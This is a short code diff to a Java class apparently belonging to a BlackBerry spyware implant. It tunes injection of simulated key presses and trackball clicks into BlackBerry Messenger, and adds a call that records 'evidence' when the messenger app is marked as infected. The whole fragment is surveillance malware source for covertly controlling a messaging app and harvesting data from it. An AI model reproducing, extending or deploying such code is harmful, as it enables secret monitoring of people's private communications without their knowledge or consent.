@@ -15,6 +15,7 @@ import net.rim.device.api.ui.Keypad;
 import net.rim.device.api.ui.UiApplication;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
+import blackberry.evidence.Evidence;
 import blackberry.injection.AppInjectorInterface;
 import blackberry.injection.KeyInjector;
 import blackberry.interfaces.Singleton;
@@ -33,7 +34,7 @@ public class AppInjectorBBM implements AppInjectorInterface, Singleton {
 
     private static AppInjectorBBM instance;
     private static final long GUID = 0xcb37fa94a62baf5dL;
-    private static final int DELAY = 3000;
+    private static final int DELAY = 5000;
     
     private int tries =0;
 
@@ -90,9 +91,9 @@ public class AppInjectorBBM implements AppInjectorInterface, Singleton {
         debug.trace("callMenuByKey press raw key");
         //#endif
         KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);
-        Utils.sleep(100);
+        Utils.sleep(200);
         KeyInjector.pressRawKey(menu.toString().toLowerCase().charAt(0));
-        Utils.sleep(100);
+        Utils.sleep(200);
         KeyInjector.trackBallRawClick();
         //KeyInjector.trackBallClick();
 
@@ -120,6 +121,7 @@ public class AppInjectorBBM implements AppInjectorInterface, Singleton {
     }
 
     public void setInfected() {
+        Evidence.info("BBM");
         infected = true;
     }
 
